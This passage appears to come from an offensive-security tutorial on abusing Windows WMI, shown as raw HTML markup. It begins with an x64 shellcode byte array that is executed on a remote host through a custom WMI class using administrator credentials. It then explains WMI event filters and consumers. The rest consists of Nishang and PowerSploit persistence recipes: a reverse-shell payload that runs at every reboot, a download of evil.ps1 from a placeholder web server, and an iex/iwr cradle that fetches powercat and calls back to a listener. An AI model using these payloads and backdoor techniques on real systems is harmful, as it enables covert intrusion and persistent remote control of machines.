class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x56&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x34&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x88&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xac&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x38&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x75&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xf1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x03&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x08&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x45&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x39&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x75&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x58&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x44&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x40&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x49&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x66&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x44&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x40&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x1c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x49&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x04&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x88&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x58&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x58&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x5e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x59&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x5a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x58&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x59&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x5a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x83&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xec&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x58&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x59&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x5a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x12&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x57&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x5d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xba&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xba&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x6f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x87&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xbb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x1d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x2a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xba&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xa6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xbd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x9d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x83&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x28&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x3c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x06&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x7c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xfb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x75&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x05&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xbb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x47&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x13&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x72&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x6f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x6a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x59&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x89&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xda&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x63&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x61&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x6c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x63&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cimv2&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Evil&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">ExecShellCode&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="nv">$sc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$null&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYEBRLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="persistence---wmi-events">Persistence - WMI Events&lt;/h3>
&lt;p>WMI has an event infrastructure which provides the capability of receveing notifications and respond changes happening on a system. For example, an event can be triggered on user logon, process creation, registry change, file creation or change and so on. It is possible to create both synchronous or asynchronous queries in order to constanly monitor the system.&lt;/p>
&lt;p>An &lt;strong>event consumer&lt;/strong> (used to consume event) can be:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Temporary&lt;/strong>: Receives event notifications as long as the client application/host is active&lt;/li>
&lt;li>&lt;strong>Permanent&lt;/strong>: Receives event notifications at all times (even across reboots), it is saved in the WMI repository and runs as SYSTEM.&lt;/li>
&lt;/ul>
&lt;p>&lt;em>Permanent event consumers&lt;/em> are the most interesting and are characterized by:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Filter&lt;/strong>: The event which occurs&lt;/li>
&lt;li>&lt;strong>Consumer&lt;/strong>: The action to be performed when the event occurs&lt;/li>
&lt;li>&lt;strong>Binding&lt;/strong>: The established relationship between Filter and Consumer&lt;/li>
&lt;/ul>
&lt;p>There are 2 types of WMI events:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Intrinsic&lt;/strong>: Events which are triggered on a change (creation, modification or deletion) in the standard WMI model. Intrinsic events are system classes included in every namespace. There is a polling time for most of them and it is possible to miss event firings. For example, the creation of a new instance of Win32_LogicalDisk is an __InstanceCreationEvent type.&lt;/p>
&lt;ul>
&lt;li>__NamespaceOperationEvent&lt;/li>
&lt;li>__NamespaceModificationEvent&lt;/li>
&lt;li>__NamespaceDeletionEvent&lt;/li>
&lt;li>__NamespaceCreationEvent&lt;/li>
&lt;li>__ClassOperationEvent&lt;/li>
&lt;li>__ClassDeletionEvent&lt;/li>
&lt;li>__ClassModificationEvent&lt;/li>
&lt;li>__ClassCreationEvent&lt;/li>
&lt;li>__InstanceOperationEvent&lt;/li>
&lt;li>__InstanceCreationEvent&lt;/li>
&lt;li>__MethodInvocationEvent&lt;/li>
&lt;li>__InstanceModificationEvent&lt;/li>
&lt;li>__InstanceDeletionEvent&lt;/li>
&lt;li>__TimerEvent&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Extrinsic&lt;/strong>: A predefined occurence that cannot be directly linked to changes in the WMI model. These events are defined by the providers themselves. They do not have as much coverage as intrinsic events. There is no chance of missing them. For example, a computer shutdown event.&lt;/p>
&lt;ul>
&lt;li>ROOT\CIMV2:Win32_ComputerShutdownEvent&lt;/li>
&lt;li>ROOT\CIMV2:Win32_IP4RouteTableEvent&lt;/li>
&lt;li>ROOT\CIMV2:Win32_ProcessStartTrace&lt;/li>
&lt;li>ROOT\CIMV2:Win32_ModuleLoadTrace&lt;/li>
&lt;li>ROOT\CIMV2:Win32_ThreadStartTrace&lt;/li>
&lt;li>ROOT\CIMV2:Win32_VolumeChangeEvent&lt;/li>
&lt;li>ROOT\CIMV2:Msft_WmiProvider*&lt;/li>
&lt;li>ROOT\DEFAULT:RegistryKeyChangeEvent&lt;/li>
&lt;li>ROOT\DEFAULT:RegistryValueChangeEvent&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Filters&lt;/strong> represent the definition of the event to trigger and take the form of a WMI query:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Intrinsic query&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">SELECT &lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">FROM&lt;/span> &lt;span class="n">__InstanceOperationEvent&lt;/span> &lt;span class="n">WITHIN&lt;/span> &lt;span class="mf">30&lt;/span> &lt;span class="nb">WHERE &lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">__CLASS&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;__InstanceCreationEvent&amp;#34;&lt;/span> &lt;span class="n">OR&lt;/span> &lt;span class="n">__CLASS&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;__InstanceModificationEvent&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">AND&lt;/span> &lt;span class="n">TargetInstance&lt;/span> &lt;span class="n">ISA&lt;/span> &lt;span class="s2">&amp;#34;CIM_DataFile&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">AND&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">TargetInstance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Extension&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;doc&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">OR&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">TargetInstance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Extension&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;docx&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>Extrinsic query&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">SELECT &lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">FROM&lt;/span> &lt;span class="n">Win32_VolumeChangeEvent&lt;/span> &lt;span class="nb">WHERE &lt;/span>&lt;span class="n">EventType&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>These are the standard event &lt;strong>consumers&lt;/strong>:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Class&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;strong>ActiveScriptEventConsumer&lt;/strong>&lt;/td>
&lt;td>Executes a predefined VBScript or Jscript&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>CommandLineEventConsumer&lt;/strong>&lt;/td>
&lt;td>Launches a process with SYSTEM privileges&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>LogFileEventConsumer&lt;/td>
&lt;td>Write data to a log file&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>NTEventLogEventConsumer&lt;/td>
&lt;td>Logs a message to the Windows event log&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SMTPEventConsumer&lt;/td>
&lt;td>Sends an email using SMTP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>and are present in the following namespaces:&lt;/p>
&lt;ul>
&lt;li>ROOT\CIMV2&lt;/li>
&lt;li>ROOT\DEFAULT&lt;/li>
&lt;/ul>
&lt;p>Events can be exploited to add persistence to a box by using &lt;code>Add-Persistence.ps1&lt;/code> from &lt;code>Nishang&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># It is convenient to setup a persistent listener&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8080&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Utility/Add-Persistence.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Add-Persistence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Drop the reverse shell PowerShell script and WindowsSanity.vbs on the target box. The VBscript file and thus the PowerShell payload will be executed on every reboot. Please note that C:\test\Invoke-PowerShellTcpOneLine.ps1 is the path on the target machine.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Persistence&lt;/span> &lt;span class="n">-PayloadPath&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="nb">Invoke-PowerShellTcpOneLine&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Use the above to download and execute in memory the evil.ps1 script everytime the target machine reboots.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Persistence&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">yourwebserver&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">evil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># The backdoor will be activated after 4 minutes of system uptime&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Utility/Remove-Persistence.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Remove-Persistence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Remove-Persistence&lt;/span> &lt;span class="n">-Remove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The same result can be achieved by &lt;code>Persistence.psm1&lt;/code> from &lt;code>PowerSploit&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">Persistence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Command&lt;/span> &lt;span class="n">-Module&lt;/span> &lt;span class="n">Persistence&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Creates a script containing the contents of EvilPayload.ps1 that when executed with the &amp;#39;-Persist&amp;#39; switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ElevatedOptions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-ElevatedPersistenceOption&lt;/span> &lt;span class="n">-PermanentWMI&lt;/span> &lt;span class="n">-Daily&lt;/span> &lt;span class="n">-At&lt;/span> &lt;span class="s1">&amp;#39;3 PM&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$UserOptions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-UserPersistenceOption&lt;/span> &lt;span class="n">-Registry&lt;/span> &lt;span class="n">-AtLogon&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Persistence&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">EvilPayload&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-ElevatedPersistenceOption&lt;/span> &lt;span class="nv">$ElevatedOptions&lt;/span> &lt;span class="n">-UserPersistenceOption&lt;/span> &lt;span class="nv">$UserOptions&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Creates a script containing the contents of the provided scriptblock that when executed with the &amp;#39;-Persist&amp;#39; switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime. The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement. The final, encoded output is finally saved to .\EncodedPersistentScript.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Rickroll&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nb">iex &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">iwr &lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">raw&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">githubusercontent&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">besimorhino&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ps1&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="n">ws01&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8081&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ElevatedOptions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-ElevatedPersistenceOption&lt;/span> &lt;span class="n">-ScheduledTask&lt;/span> &lt;span class="n">-OnIdle&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$UserOptions&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-UserPersistenceOption&lt;/span> &lt;span class="n">-ScheduledTask&lt;/span> &lt;span class="n">-OnIdle&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Persistence&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="nv">$RickRoll&lt;/span> &lt;span class="n">-ElevatedPersistenceOption&lt;/span> &lt;span class="nv">$ElevatedOptions&lt;/span> &lt;span class="n">-UserPersistenceOption&lt;/span> &lt;span class="nv">$UserOptions&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-PassThru&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-EncodedCommand&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">EncodedPersistentScript&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>by &lt;code>WMIBackdoor.ps1&lt;/code>:&lt;/p>
